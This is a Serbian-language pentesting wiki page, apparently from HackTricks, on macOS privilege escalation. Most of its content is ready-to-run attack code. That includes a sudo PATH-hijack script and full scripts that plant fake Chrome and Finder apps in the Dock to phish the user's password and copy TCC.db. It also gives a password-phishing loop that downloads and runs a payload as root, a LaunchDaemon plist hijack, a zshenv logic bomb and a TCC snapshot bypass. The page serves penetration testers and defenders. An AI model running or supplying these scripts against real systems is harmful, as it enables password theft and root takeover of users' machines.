# Eskalacija privilegija na macOS-u

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Ako ste ovde došli tražeći TCC privilege escalation, idite na:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Imajte na umu da će **većina trikova za privilege escalation koji utiču na Linux/Unix takođe uticati i na** računare sa sistemom **macOS**. Zato pogledajte:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Interakcija sa korisnikom

### Sudo Hijacking

Originalnu [Sudo Hijacking tehniku možete pronaći u tekstu Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Međutim, macOS **zadržava** korisnikov **`PATH`** kada on izvršava **`sudo`**. To znači da bi drugi način za izvođenje ovog napada bio **hijacking drugih binarnih datoteka** koje žrtva i dalje izvršava prilikom **pokretanja sudo-a:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Imajte na umu da će korisnik koji koristi **terminal** vrlo verovatno imati instaliran **Homebrew**. Zato je moguće hijack-ovati binarne fajlove u **`/opt/homebrew/bin`**.

### Dock Impersonation

Korišćenjem **social engineering-a** možete, na primer, **impersonate-ovati Google Chrome** unutar dock-a i zapravo izvršiti sopstveni script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Neki predlozi:

- Proverite da li se u Dock-u nalazi Chrome i, ako postoji, **uklonite** taj unos i **dodajte** **fake** **Chrome unos na istoj poziciji** u Dock nizu.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Neki predlozi:

- **Ne možete ukloniti Finder iz Dock-a**, pa ako ćete ga dodati u Dock, možete postaviti lažni Finder odmah pored pravog. Za to morate **dodati unos lažnog Finder-a na početak Dock niza**.
- Druga opcija je da ga ne postavite u Dock, već ga samo otvorite; poruka „Finder traži kontrolu nad Finder-om“ nije naročito čudna.
- Još jedna opcija za **eskalaciju na root bez traženja** lozinke uz užasan prozor jeste da učinite da Finder zaista zatraži lozinku za izvršavanje privilegovane radnje:
- Zatražite od Finder-a da kopira novi **`sudo`** fajl u **`/etc/pam.d`** (upit za lozinku će navesti da „Finder želi da kopira sudo“)
- Zatražite od Finder-a da kopira novi **Authorization Plugin** (možete kontrolisati naziv fajla, tako da će upit za lozinku navesti da „Finder želi da kopira Finder.bundle“)

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Phishing za prompt lozinke + reuse sudo-a

Malware često zloupotrebljava interakciju sa korisnikom kako bi **uhvatio lozinku koja omogućava sudo** i programski je ponovo upotrebio. Uobičajen tok:

1. Identifikujte prijavljenog korisnika pomoću `whoami`.
2. **Ponavljajte promptove za lozinku** sve dok `dscl . -authonly "$user" "$pw"` ne vrati uspeh.
3. Keširajte credential (npr. `/tmp/.pass`) i izvršavajte privilegovane radnje pomoću `sudo -S` (lozinka preko standardnog ulaza).

Primer minimalnog lanca:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Ukradena lozinka se zatim može ponovo koristiti za **uklanjanje Gatekeeper quarantine zaštite pomoću `xattr -c`**, kopiranje LaunchDaemons ili drugih privilegovanih datoteka i neinteraktivno pokretanje dodatnih faza.

## Novije vektore specifične za macOS (2023–2025)

### Zastareli `AuthorizationExecuteWithPrivileges` je i dalje upotrebljiv

`AuthorizationExecuteWithPrivileges` je zastareo od verzije 10.7, ali **i dalje radi na sistemima Sonoma/Sequoia**. Mnogi komercijalni updater-i pozivaju `/usr/libexec/security_authtrampoline` sa nepouzdanom putanjom. Ako je ciljna binarna datoteka upisiva za korisnika, možete postaviti trojanca i iskoristiti legitimni prompt:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Kombinujte sa **masquerading tricks above** da biste prikazali uverljiv dijalog za lozinku.


### Triage privilegovanog helper-a / XPC-a

Mnogi moderni macOS privescs trećih strana prate isti obrazac: **root LaunchDaemon** izlaže **Mach/XPC service** iz **`/Library/PrivilegedHelperTools`**, a zatim helper ili **ne validira klijenta**, validira ga **prekasno** (PID race), ili izlaže **root method** koji koristi putanju/script pod kontrolom korisnika. Ovo je klasa grešaka koja stoji iza mnogih nedavnih helper bugova u VPN klijentima, game launcherima i updaterima.

Kratka triage checklista:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Posebnu pažnju obratite na helper-e koji:

- nastavljaju da prihvataju zahteve **nakon uninstall-a** jer je job ostao učitan u `launchd`
- izvršavaju skripte ili čitaju konfiguraciju iz putanja **`/Applications/...`** ili drugih putanja u koje korisnici koji nisu root mogu da upisuju
- oslanjaju se na validaciju peer-a zasnovanu na **PID-u** ili samo na **bundle-id-u**, koja može biti podložna race uslovima

Za više detalja o greškama u autorizaciji helper-a pogledajte [ovu stranicu](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Nasleđivanje okruženja skripte PackageKit-a (CVE-2024-27822)

Sve dok Apple to nije ispravio u verzijama **Sonoma 14.5**, **Ventura 13.6.7** i **Monterey 12.7.5**, instalacije koje je korisnik pokretao putem **`Installer.app`** / **`PackageKit.framework`** mogle su da izvrše **PKG skripte kao root unutar okruženja trenutnog korisnika**. To znači da bi paket koji koristi **`#!/bin/zsh`** učitao napadačev **`~/.zshenv`** i izvršio ga kao **root** kada žrtva instalira paket.

Ovo je posebno zanimljivo kao **logic bomb**: potreban vam je samo foothold na korisničkom nalogu i fajl za pokretanje shell-a u koji može da se upisuje, a zatim čekate da korisnik pokrene bilo koji ranjivi installer zasnovan na **zsh-u**. Ovo se uglavnom **ne odnosi** na **MDM/Munki** deployment-e, jer se oni izvršavaju unutar okruženja root korisnika.
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Ako želite detaljniji pregled zloupotrebe specifične za installere, pogledajte i [ovu stranicu](macos-files-folders-and-binaries/macos-installers-abuse.md).

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Ako su LaunchDaemon plist ili njegov cilj `ProgramArguments` **upisivi od strane korisnika**, možete eskalirati privilegije tako što ćete ga zameniti, a zatim naterati launchd da ga ponovo učita:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Ovo odražava exploit obrazac objavljen za **CVE-2025-24085**, pri čemu je plist sa dozvolom upisa iskorišćen za izvršavanje koda napadača sa root privilegijama.

### XNU SMR trka za credential (CVE-2025-24118)

**Trka u `kauth_cred_proc_update`** omogućava lokalnom napadaču da ošteti pokazivač na credential samo za čitanje (`proc_ro.p_ucred`) izvršavanjem `setgid()`/`getgid()` petlji u više thread-ova, sve dok ne dođe do necelovitog `memcpy`-ja. Uspešna korupcija daje **uid 0** i pristup kernel memoriji. Minimalna struktura PoC-a:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Kombinujte sa **heap grooming** tehnikom kako biste postavili kontrolisane podatke tamo gde se pokazivač ponovo čita. Na ranjivim verzijama ovo omogućava pouzdan **local kernel privesc** bez potrebe za SIP bypass-om.

### SIP bypass putem Migration assistant-a ("Migraine", CVE-2023-32369)

Ako već imate root, SIP i dalje blokira upisivanje u sistemske lokacije. Greška **Migraine** zloupotrebljava Migration Assistant entitlement `com.apple.rootless.install.heritable` kako bi pokrenula child proces koji nasleđuje SIP bypass i prepisuje zaštićene putanje (npr. `/System/Library/LaunchDaemons`). Lanac:

1. Dobavite root na aktivnom sistemu.
2. Aktivirajte `systemmigrationd` koristeći posebno kreirano stanje kako bi pokrenuo binary kojim upravlja napadač.
3. Iskoristite nasleđeni entitlement za izmenu SIP-zaštićenih datoteka, čime se persistence zadržava i nakon reboot-a.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Više Apple daemon-a prihvata **NSPredicate** objekte putem XPC-a i proverava samo polje `expressionType`, kojim upravlja napadač. Kreiranjem predicate-a koji izvršava proizvoljne selektore možete ostvariti **code execution u root/system XPC servisima** (npr. `coreduetd`, `contextstored`). Kada se kombinuje sa početnim app sandbox escape-om, ovo omogućava **privilege escalation bez user prompt-ova**. Potražite XPC endpoint-e koji deserijalizuju predicate-e i nemaju robustan visitor.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass i privilege escalation

**Bilo koji user** (čak i unprivileged user-i) može kreirati i mount-ovati time machine snapshot i **pristupiti SVIM datotekama** tog snapshot-a.\
**Jedina privilegija** koja je potrebna jeste da aplikacija koja se koristi (kao što je `Terminal`) ima **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`), koji mora odobriti admin.

<details>
<summary>Mount Time Machine snapshot</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

Detaljnije objašnjenje možete [**pronaći u originalnom izveštaju**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Osetljive informacije

Ovo može biti korisno za eskalaciju privilegija:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Reference

- [Microsoft „Migraine“ SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up i PoC](https://github.com/jprx/CVE-2025-24118)
- [CVE-2024-27822: eskalacija privilegija u macOS PackageKit-u](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [CVE-2024-30165: lokalna eskalacija privilegija u AWS Client VPN-u za macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
